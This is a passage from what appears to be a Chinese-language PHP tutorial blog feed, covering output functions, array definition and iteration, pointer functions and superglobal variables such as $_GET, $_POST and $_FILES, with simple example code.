&lt;code&gt;echo()&lt;/code&gt;和&lt;code&gt;print()&lt;/code&gt;都只能输出字符串，而不能输出数组&lt;h3 id=&quot;输出字符串并退出程序&quot;&gt;&lt;a href=&quot;#输出字符串并退出程序&quot; class=&quot;headerlink&quot; title=&quot;输出字符串并退出程序&quot;&gt;&lt;/a&gt;输出字符串并退出程序&lt;/h3&gt;&lt;code&gt;die()和exit()&lt;/code&gt;：输出一个字符串后退出程序&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$string &amp;#x3D; &amp;quot;123&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#x2F;&amp;#x2F;die($string);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;exit($string);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;echo &amp;quot;我不会运行&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;code&gt;die()&lt;/code&gt;和&lt;code&gt;exit()&lt;/code&gt;同样都只能输出字符串，而不能输出数组&lt;h3 id=&quot;格式化输出字符串&quot;&gt;&lt;a href=&quot;#格式化输出字符串&quot; class=&quot;headerlink&quot; title=&quot;格式化输出字符串&quot;&gt;&lt;/a&gt;格式化输出字符串&lt;/h3&gt;字符串转换格式：&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;格式&lt;/th&gt;
&lt;th&gt;作用&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;%%&lt;/td&gt;
&lt;td&gt;返回百分比符号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;%b&lt;/td&gt;
&lt;td&gt;二进制数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;%c&lt;/td&gt;
&lt;td&gt;依照ASCII值的字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;%d&lt;/td&gt;
&lt;td&gt;带符号十进制数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;%e&lt;/td&gt;
&lt;td&gt;可续计数法（如1.5e3）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;%u&lt;/td&gt;
&lt;td&gt;无符号十进制数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;%f或%F&lt;/td&gt;
&lt;td&gt;浮点数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;%o&lt;/td&gt;
&lt;td&gt;八进制数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;%s&lt;/td&gt;
&lt;td&gt;字符串&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;%x或%X&lt;/td&gt;
&lt;td&gt;十六进制数&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;printf()&lt;/code&gt;：输出格式化字符串&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sprintf()&lt;/code&gt;：把格式化的字符串写入一个变量中&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;printf()&lt;/code&gt;和&lt;code&gt;sprintf()&lt;/code&gt;都是格式化输出字符串，区别在于&lt;code&gt;sprintf()&lt;/code&gt;可以把格式化的字符串写入到一个变量中&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;printf(&amp;quot;我是%s&amp;quot;,&amp;quot;test&amp;quot;);    &amp;#x2F;&amp;#x2F;输出我是test&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$aa &amp;#x3D; sprintf(&amp;quot;我是%s&amp;quot;,&amp;quot;test&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;echo $aa;   &amp;#x2F;&amp;#x2F;输出我是test&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;常用的字符串格式化函数&quot;&gt;&lt;a href=&quot;#常用的字符串格式化函数&quot; class=&quot;headerlink&quot; title=&quot;常用的字符串格式化函数&quot;&gt;&lt;/a&gt;常用的字符串格式化函数&lt;/h2&gt;</summary>
    
    
    
    <category term="PHP基础" scheme="https://hzktester.top/categories/PHP%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="PHP基础" scheme="https://hzktester.top/tags/PHP%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>数组的定义，遍历，预定义数组、数组相关处理函数</title>
    <link href="https://hzktester.top/posts/50045358.html"/>
    <id>https://hzktester.top/posts/50045358.html</id>
    <published>2020-11-06T04:55:00.000Z</published>
    <updated>2020-11-06T04:56:17.553Z</updated>
    
    <content type="html"><![CDATA[<h2 id="数组的概述"><a href="#数组的概述" class="headerlink" title="数组的概述"></a>数组的概述</h2><p><code>PHP</code>中的数组实际上是一个有序图。图是一种把 <code>values</code> 映射到 <code>keys</code> 的类型。此类型在很多方面做了优化，因此可以把它当成真正的数组来使用，或列表（矢量），散列表（是图的一种实现），字典，集合，队列以及更多可能性。因为可以用另一个 <code>PHP</code> 数组作为值，也可以很容易地模拟树。</p><ul><li><strong>数组下标</strong>：可以视为资料内容在此数组中的识别名称，通常被称为数组下标。</li><li>当<strong>索引值为数值</strong>时，也代表此资料内容在数组中的储存位置。</li><li>数组中有几个索引值就被称为几维数组。</li><li>数据分类：在PHP中有两种数组，<strong>索引数组</strong>和<strong>关联数组</strong>。<ul><li><strong>索引（indexed）数组</strong>的索引值是整数，以0开始。当通过位置来标识东西时用索引数组。</li><li><strong>关联（associative）数组</strong>以字符串做为索引值，关联数组更像操作表。索引值为列名，用于访问列的数据。</li></ul></li></ul><h2 id="数组的定义"><a href="#数组的定义" class="headerlink" title="数组的定义"></a>数组的定义</h2><p>由于 <code>PHP</code> 是属于弱类型数据，因此源代码中的数组并不需要经过特别的声明操作，直接将一组数值指定给某一数组元素即可。一般情况下数组的赋值有三种方式：</p><ul><li>直接赋值方式如：  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a[0]&#x3D;&#39;spam@126.com&#39;;  </span><br><span class="line">$a[1]&#x3D;&#39;abuse@sohu.com&#39;;</span><br></pre></td></tr></table></figure></li><li>使用<code>array</code>函数如：  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a&#x3D;array(&quot;spam@126.com&quot;,&quot;abuse@sohu.com&quot;);</span><br></pre></td></tr></table></figure></li><li>使用<code>[]</code>如：  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a&#x3D;[&quot;spam@126.com&quot;,&quot;abuse@sohu.com&quot;];</span><br></pre></td></tr></table></figure><h3 id="直接赋值的方式声明数组"><a href="#直接赋值的方式声明数组" class="headerlink" title="直接赋值的方式声明数组"></a>直接赋值的方式声明数组</h3>基本格式：<code>$数组变量名[索引值]=资料内容</code></li></ul><p>其中<strong>索引值（下标）可以是一个字符串或一个整数</strong>。等价于整数（不以0开头）的字符串值被当作整数对待。因此，数组<code>$array[3]</code>与<code>$array[&#39;3&#39;]</code>是引用相同的元素。但是<code>$array[&#39;03&#39;]</code>引用的另外不同的元素。</p><h4 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h4><p>分别定义两个数组<code>$a</code>和<code>$b</code>，看看区别：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a[0]&#x3D;1;</span><br><span class="line">$a[1]&#x3D;2;</span><br><span class="line">$a[2]&#x3D;3;</span><br><span class="line"></span><br><span class="line">$b[]&#x3D;1;     &#x2F;&#x2F;不定义下标默认从0开始</span><br><span class="line">$b[]&#x3D;2;</span><br><span class="line">$b[]&#x3D;3;</span><br><span class="line">$b[6]&#x3D;4;    &#x2F;&#x2F;定义下标为6的值</span><br><span class="line">$b[]&#x3D;5;     &#x2F;&#x2F;后面的顺延下标为7</span><br><span class="line"></span><br><span class="line">var_dump($a);</span><br><span class="line">echo &quot;&lt;br&gt;---------------&lt;br&gt;&quot;;</span><br><span class="line">var_dump($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>页面显示结果：</p><p><img src="https://qiniu.hzktester.top/tp2020102201.png" alt="image"></p><h4 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h4><p>下标定义为字符串的使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a[&quot;name&quot;]&#x3D;&quot;zhang&quot;;</span><br><span class="line">$a[&quot;sex&quot;]&#x3D;&quot;man&quot;;</span><br><span class="line">$a[&quot;age&quot;]&#x3D;23;</span><br><span class="line"></span><br><span class="line">$b[&quot;name&quot;]&#x3D;&quot;lisi&quot;;</span><br><span class="line">$b[]&#x3D;&quot;woman&quot;;       &#x2F;&#x2F;不定义下标默认为0</span><br><span class="line">$b[&quot;age&quot;]&#x3D;28;</span><br><span class="line">$b[8]&#x3D;4;            &#x2F;&#x2F;定义下标为8的值</span><br><span class="line">$b[]&#x3D;5;             &#x2F;&#x2F;后面的顺延下标为9</span><br><span class="line"></span><br><span class="line">var_dump($a);</span><br><span class="line">echo &quot;&lt;br&gt;---------------&lt;br&gt;&quot;;</span><br><span class="line">var_dump($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>页面显示结果：</p><p><img src="https://qiniu.hzktester.top/tp2020102201.png" alt="image"></p><h3 id="使用array-结构新建数组"><a href="#使用array-结构新建数组" class="headerlink" title="使用array()结构新建数组"></a>使用array()结构新建数组</h3><ul><li>基本格式：  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">array([key&#x3D;&gt;]value,...) </span><br><span class="line">&#x2F;&#x2F;key可以是数字或字符串</span><br><span class="line">&#x2F;&#x2F;value可以是任意值</span><br></pre></td></tr></table></figure></li><li>如果键名是一个<code>int</code>类型的标准表达方法，则被解释为整数（例如 8 将被解释为 8，而 “08” 将被解释为 “08”）。<code>key</code>中的浮点数被取整为 <code>int</code>。<code>PHP</code> 中没有不同的数字下标和关联下标数组，数组的类型只有一种，它可以同时包含整型和字符串型的下标。 </li><li>如果对给出的值没有指定键名，则取当前最大的整数索引值，而新的键名将是该值加一。如果指定的键名已经有了值，则该值会被覆盖。 </li></ul><h4 id="示例1：-1"><a href="#示例1：-1" class="headerlink" title="示例1："></a>示例1：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;array(1,2,3,4,5,6);</span><br><span class="line">$b&#x3D;array(&quot;one&quot;, &quot;two&quot;, &quot;three&quot;);</span><br><span class="line">$c&#x3D;array(0&#x3D;&gt;&quot;aaa&quot;,1&#x3D;&gt;&quot;bbb&quot;,2&#x3D;&gt;&quot;ccc&quot;);</span><br><span class="line">$d&#x3D;array(&quot;aaa&quot;,6&#x3D;&gt;&quot;bbb&quot;,&quot;ccc&quot;);</span><br><span class="line">$e&#x3D;array(&quot;name&quot;&#x3D;&gt;&quot;zhang&quot;, &quot;age&quot;&#x3D;&gt;20);</span><br><span class="line"></span><br><span class="line">var_dump($a);</span><br><span class="line">echo &quot;&lt;br&gt;---------------&lt;br&gt;&quot;;</span><br><span class="line">var_dump($b);</span><br><span class="line">echo &quot;&lt;br&gt;---------------&lt;br&gt;&quot;;</span><br><span class="line">var_dump($c);</span><br><span class="line">echo &quot;&lt;br&gt;---------------&lt;br&gt;&quot;;</span><br><span class="line">var_dump($d);</span><br><span class="line">echo &quot;&lt;br&gt;---------------&lt;br&gt;&quot;;</span><br><span class="line">var_dump($e);</span><br><span class="line">echo &quot;&lt;br&gt;---------------&lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>页面显示结果：</p><p><img src="https://qiniu.hzktester.top/tp2020102203.png" alt="image"></p><h3 id="使用-定义数组"><a href="#使用-定义数组" class="headerlink" title="使用[] 定义数组"></a>使用[] 定义数组</h3><h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; [10,20,30,40,50];</span><br><span class="line">$b &#x3D; [0&#x3D;&gt;10,1&#x3D;&gt;20,2&#x3D;&gt;30];</span><br><span class="line">$c &#x3D; [&quot;name&quot;&#x3D;&gt;&quot;zhangsan&quot;,&quot;age&quot;&#x3D;&gt;20];</span><br></pre></td></tr></table></figure><h3 id="多维数组的声明"><a href="#多维数组的声明" class="headerlink" title="多维数组的声明"></a>多维数组的声明</h3><p>多维数组的声明方式及规则，与一维数组相同，例如:下面二维数组的声明片段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;php </span><br><span class="line">    $a &#x3D; [&#39;1&#39;,&#39;2&#39;,[&#39;1&#39;,&#39;2&#39;,&#39;3&#39;]];</span><br><span class="line">var_dump($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>页面显示结果：</p><p><img src="https://qiniu.hzktester.top/tp2020102204.png" alt="image"></p><h2 id="数组的遍历"><a href="#数组的遍历" class="headerlink" title="数组的遍历"></a>数组的遍历</h2><h3 id="使用for语句遍历数组"><a href="#使用for语句遍历数组" class="headerlink" title="使用for语句遍历数组"></a>使用for语句遍历数组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    &#x2F;&#x2F;下标     0  1   for      2  3  4  5 6 10        11    12</span><br><span class="line">  $arr&#x3D;array(1, 3, &quot;for&quot;&#x3D;&gt;4, 5, 6, 7, 8,9,10&#x3D;&gt;&quot;aa&quot;,&quot;bb&quot;, &quot;cc&quot;);</span><br><span class="line"></span><br><span class="line">for($i&#x3D;0; $i&lt;count($arr); $i++)&#123;        &#x2F;&#x2F;使用count得到数组的总数遍历</span><br><span class="line">echo &quot;\$arr[&quot;.$i.&quot;]&#x3D;&quot;.$arr[$i].&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102205.png" alt="image"></p><p>下标为7，8，9的不存在所以报错</p><h3 id="使用foreach语句遍历数组"><a href="#使用foreach语句遍历数组" class="headerlink" title="使用foreach语句遍历数组"></a>使用foreach语句遍历数组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $arr&#x3D;array(1, 3, &quot;for&quot;&#x3D;&gt;4, 5, 6, 7, 8,9,10&#x3D;&gt;&quot;aa&quot;,&quot;bb&quot;, &quot;cc&quot;);</span><br><span class="line"></span><br><span class="line">foreach ($arr as $k &#x3D;&gt; $v) &#123;</span><br><span class="line">echo &quot;\$arr[&quot;.$k.&quot;]&#x3D;&quot;.$v.&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102206.png" alt="image"></p><p>使用<code>foreach</code>循环不会报错</p><h3 id="联合使用list-、each-和while循环遍历数组"><a href="#联合使用list-、each-和while循环遍历数组" class="headerlink" title="联合使用list()、each()和while循环遍历数组"></a>联合使用list()、each()和while循环遍历数组</h3><p>两种写法：</p><h4 id="写法1："><a href="#写法1：" class="headerlink" title="写法1："></a>写法1：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $fruit&#x3D; array(&#39;a&#39; &#x3D;&gt; &#39;apple&#39;, &#39;b&#39; &#x3D;&gt; &#39;banana&#39;, &#39;c&#39; &#x3D;&gt; &#39;cranberry&#39;);</span><br><span class="line">while (list($key, $val) &#x3D; each($fruit)) &#123;</span><br><span class="line">echo &quot;$key &#x3D;&gt; $val\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="写法2："><a href="#写法2：" class="headerlink" title="写法2："></a>写法2：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $arr&#x3D;array(&quot;one&quot;&#x3D;&gt;&quot;aaa&quot;, &quot;two&quot;&#x3D;&gt;&quot;bbb&quot;, &quot;three&quot;&#x3D;&gt;&quot;cccc&quot;);</span><br><span class="line">    while($sz&#x3D;each($arr))&#123;</span><br><span class="line">&#x2F;&#x2F;echo $sz[0].&quot;&#x3D;&#x3D;&#x3D;&gt;&quot;.$sz[1].&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $sz[&quot;key&quot;].&quot;&#x3D;&#x3D;&#x3D;&gt;&quot;.$sz[&quot;value&quot;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102207.png" alt="image"></p><h3 id="使用数组内部指针控制函数遍历数组"><a href="#使用数组内部指针控制函数遍历数组" class="headerlink" title="使用数组内部指针控制函数遍历数组"></a>使用数组内部指针控制函数遍历数组</h3><p>定义一个数组如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$info &#x3D; [1,2,3,4,5,6,7,8,9];</span><br></pre></td></tr></table></figure><ul><li><code>next()</code>：将指针向后移动一位<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(next($info));</span><br><span class="line">&#x2F;&#x2F;输出int(2)</span><br></pre></td></tr></table></figure></li><li><code>prev()</code>：将指针向前移动一位<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(prev($info));</span><br><span class="line">&#x2F;&#x2F;指针向前移动一位是-1，所以输出bool(false)</span><br></pre></td></tr></table></figure></li><li><code>end()</code>：将指针指向数组中最后一个元素<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(end($info));</span><br><span class="line">&#x2F;&#x2F;输出最后一个元素，int(9)</span><br></pre></td></tr></table></figure></li><li><code>reset()</code>：将指针指向数组中第一个元素<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(reset($info));</span><br><span class="line">&#x2F;&#x2F;输出第一个元素，int(1)</span><br></pre></td></tr></table></figure></li><li><code>current()</code>：不会移动数组内部指针<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(current($info));</span><br><span class="line">&#x2F;&#x2F;输出默认指针值，也就是第一位。int(1)</span><br></pre></td></tr></table></figure></li><li><code>key()</code>：返回数组内部指针当前指向元素的键名<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var_dump(key($info));</span><br><span class="line">&#x2F;&#x2F;输出键名，int(0)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;如果数组改为</span><br><span class="line">$info &#x3D; [&#39;aa&#39;&#x3D;&gt;1,2,3,4,5,6,7,8,9];</span><br><span class="line">var_dump(key($info));</span><br><span class="line">&#x2F;&#x2F;输出键名，string(2) &quot;aa&quot;</span><br></pre></td></tr></table></figure></li></ul><h2 id="预定义数组"><a href="#预定义数组" class="headerlink" title="预定义数组"></a>预定义数组</h2><h3 id="服务器变量：-SERVER"><a href="#服务器变量：-SERVER" class="headerlink" title="服务器变量：$_SERVER"></a>服务器变量：$_SERVER</h3><p><code>$_SERVER</code>是一个包含诸如头信息<code>header</code>、路径<code>path</code>和脚本位置<code>script locations</code>等一系列服务器变量的数组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump($_SERVER);</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020110601.png" alt="image"></p><h3 id="环境变量：-ENV"><a href="#环境变量：-ENV" class="headerlink" title="环境变量：$_ENV"></a>环境变量：$_ENV</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump($_ENV);</span><br><span class="line">&#x2F;&#x2F;没有环境变量，输出</span><br><span class="line">&#x2F;&#x2F;array(0) &#123;</span><br><span class="line">&#x2F;&#x2F;&#125;</span><br></pre></td></tr></table></figure><h3 id="HTTP-GET变量：-GET"><a href="#HTTP-GET变量：-GET" class="headerlink" title="HTTP GET变量：$_GET"></a>HTTP GET变量：$_GET</h3><p>获取到<code>GET</code>请求内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump($_GET);</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020110602.png" alt="image"></p><h3 id="HTTP-POST变量：-POST"><a href="#HTTP-POST变量：-POST" class="headerlink" title="HTTP POST变量：$_POST"></a>HTTP POST变量：$_POST</h3><p>获取到<code>POST</code>请求内容</p><p>同目录下创建一个<code>test.php</code>文件，以<code>POST</code>请求提交一个id参数到<code>index.php</code>文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Document&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;.&#x2F;index.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot; id&#x3D;&quot;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p><code>index.php</code>文件中输出<code>POST</code>请求内容:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump($_POST);</span><br></pre></td></tr></table></figure><p>访问<code>test.php</code>提交一个参数：</p><p><img src="https://qiniu.hzktester.top/tp2020110603.png" alt="image"></p><p><img src="https://qiniu.hzktester.top/tp2020110604.png" alt="image"></p><h3 id="REQUEST变量：-REQUEST"><a href="#REQUEST变量：-REQUEST" class="headerlink" title="REQUEST变量：$_REQUEST"></a>REQUEST变量：$_REQUEST</h3><p>获取到所有请求头<code>GET,POST,COOKIE</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump($_REQUEST);</span><br></pre></td></tr></table></figure><h3 id="HTTP文件上传变量：-FILES"><a href="#HTTP文件上传变量：-FILES" class="headerlink" title="HTTP文件上传变量：$_FILES"></a>HTTP文件上传变量：$_FILES</h3><p>获取文件上传变量</p><p>修改<code>test.php</code>中的<code>form</code>表单为文件上传</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;.&#x2F;index.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;name&quot; id&#x3D;&quot;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p>访问<code>test.php</code>文件随便上传一个文件</p><p><img src="https://qiniu.hzktester.top/tp2020110605.png" alt="image"></p><p><code>index.php</code>文件中输出提交文件的参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump($_FILES);</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020110606.png" alt="image"></p><h3 id="HTTP-COOKIES变量：-COOKIE"><a href="#HTTP-COOKIES变量：-COOKIE" class="headerlink" title="HTTP COOKIES变量：$_COOKIE"></a>HTTP COOKIES变量：$_COOKIE</h3><p>获取<code>COOKIE</code>变量输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump($_COOKIE);</span><br></pre></td></tr></table></figure><h3 id="SESSION变量：-SESSION"><a href="#SESSION变量：-SESSION" class="headerlink" title="SESSION变量：$_SESSION"></a>SESSION变量：$_SESSION</h3><p>获取<code>SESSION</code>变量输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;这里一定要开启session_start()</span><br><span class="line">session_start();</span><br><span 